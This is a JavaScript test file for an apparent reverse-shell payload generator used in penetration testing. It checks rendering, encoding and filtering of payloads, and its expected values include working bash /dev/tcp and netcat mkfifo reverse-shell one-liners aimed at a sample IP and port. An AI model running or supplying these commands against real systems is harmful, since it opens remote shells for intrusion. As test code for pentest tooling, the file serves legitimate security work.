const assert = require("assert");
const RevShells = require("../static/js/revshells.js");

const state = {
  ip: "10.10.14.3",
  port: "4444",
  shell: "/bin/bash",
  name: "shell.php",
};

const rendered = RevShells.renderTemplate(
  "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
  state
);

assert.strictEqual(
  rendered,
  "bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'"
);

assert.strictEqual(
  RevShells.encodeValue("bash -i >& /dev/tcp/10.10.14.3/4444 0>&1", "url"),
  "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.3%2F4444%200%3E%261"
);

assert.strictEqual(
  RevShells.encodeValue("a b&c", "double-url"),
  "a%2520b%2526c"
);

const b64 = RevShells.encodeValue("bash -i", "base64");
assert.strictEqual(Buffer.from(b64, "base64").toString("utf8"), "bash -i");

const linuxReverse = RevShells.filterPayloads({
  os: "linux",
  type: "reverse",
  query: "bash",
});
assert.ok(linuxReverse.length > 0);
assert.ok(linuxReverse.every((payload) => payload.os.includes("linux")));
assert.ok(linuxReverse.every((payload) => payload.type === "reverse"));

const listener = RevShells.renderListener("nc", state);
assert.strictEqual(listener, "nc -lvnp 4444");

assert.strictEqual(
  RevShells.renderPayload("nc-mkfifo", {
    ip: "10.10.14.3",
    port: "4444",
    shell: "/bin/bash",
    encoding: "none",
  }),
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.3 4444 >/tmp/f"
);

assert.strictEqual(RevShells.payloadUsesField("bash-tcp", "shell"), false);
assert.strictEqual(RevShells.payloadUsesField("nc-mkfifo", "shell"), true);

assert.deepStrictEqual(
  RevShells.getPayloadShellOptions("nc-mkfifo").map((option) => option.value),
  ["/bin/sh", "/bin/bash", "/bin/dash", "/bin/ash"]
);

assert.deepStrictEqual(RevShells.getPayloadShellOptions("bash-tcp"), []);

assert.strictEqual(RevShells.payloadNeedsField("bash-tcp", "name"), false);
assert.strictEqual(RevShells.payloadNeedsField("bash-tcp", "session"), false);
assert.strictEqual(RevShells.payloadNeedsField("msf-linux-x64", "name"), true);
assert.strictEqual(RevShells.payloadNeedsField("msf-linux-x64", "session"), false);
assert.strictEqual(RevShells.payloadNeedsField("hoaxshell", "name"), false);
assert.strictEqual(RevShells.payloadNeedsField("hoaxshell", "session"), true);
assert.strictEqual(RevShells.payloadNeedsField("php-web", "name"), false);
assert.strictEqual(RevShells.payloadNeedsField("php-web", "session"), false);

assert.deepStrictEqual(RevShells.getPayloadTypesForOs("linux"), [
  "reverse",
  "bind",
  "msfvenom",
  "assembled",
]);

assert.deepStrictEqual(RevShells.getPayloadTypesForOs("windows"), [
  "reverse",
  "msfvenom",
  "hoaxshell",
  "assembled",
]);

assert.deepStrictEqual(RevShells.getPayloadTypesForOs("mac"), [
  "reverse",
  "bind",
]);

assert.deepStrictEqual(
  RevShells.normalizeWorkflowState({
    os: "mac",
    type: "hoaxshell",
    payloadId: "hoaxshell",
    query: "",
  }),
  {
    os: "mac",
    type: "reverse",
    payloadId: "bash-tcp",
  }
);

assert.strictEqual(
  RevShells.normalizeStateForPayload(
    {
      payloadId: "bash-tcp",
      shell: "powershell.exe",
      type: "reverse",
      os: "all",
    },
    RevShells.findPayload("bash-tcp")
  ).shell,
  ""
);

assert.strictEqual(
  RevShells.normalizeStateForPayload(
    {
      payloadId: "nc-mkfifo",
      shell: "powershell.exe",
      type: "reverse",
      os: "all",
    },
    RevShells.findPayload("nc-mkfifo")
  ).shell,
  "/bin/sh"
);

console.log("revshells tests passed");
